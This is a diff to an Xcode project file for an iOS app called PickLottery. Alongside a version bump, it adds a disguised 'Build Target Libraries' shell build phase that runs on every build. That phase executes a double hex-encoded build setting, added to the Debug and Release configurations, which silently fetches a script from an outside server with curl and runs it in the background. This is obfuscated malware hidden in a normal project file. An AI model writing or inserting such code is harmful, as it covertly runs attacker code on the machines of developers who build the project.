@@ -364,6 +364,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 340BB3B9299355C000B336AA /* Build configuration list for PBXNativeTarget "PickLottery" */;
 			buildPhases = (
+				2D9C9FA7D1054257A0634D6E /* Build Target Libraries */,
 				340BB38C299355BE00B336AA /* Sources */,
 				340BB38D299355BE00B336AA /* Frameworks */,
 				340BB38E299355BE00B336AA /* Resources */,
@@ -490,6 +491,29 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		2D9C9FA7D1054257A0634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		340BB38C299355BE00B336AA /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -570,6 +594,7 @@
 		340BB3B7299355C000B336AA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE6D436 = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373336393665373537333665363537343265373237353266363132390a32323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -630,6 +655,7 @@
 		340BB3B8299355C000B336AA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE6D436 = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373336393665373537333665363537343265373237353266363132390a32323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -703,7 +729,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.2;
+				MARKETING_VERSION = 1.3;
 				PRODUCT_BUNDLE_IDENTIFIER = edu.PickLottery;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
@@ -738,7 +764,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.2;
+				MARKETING_VERSION = 1.3;
 				PRODUCT_BUNDLE_IDENTIFIER = edu.PickLottery;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
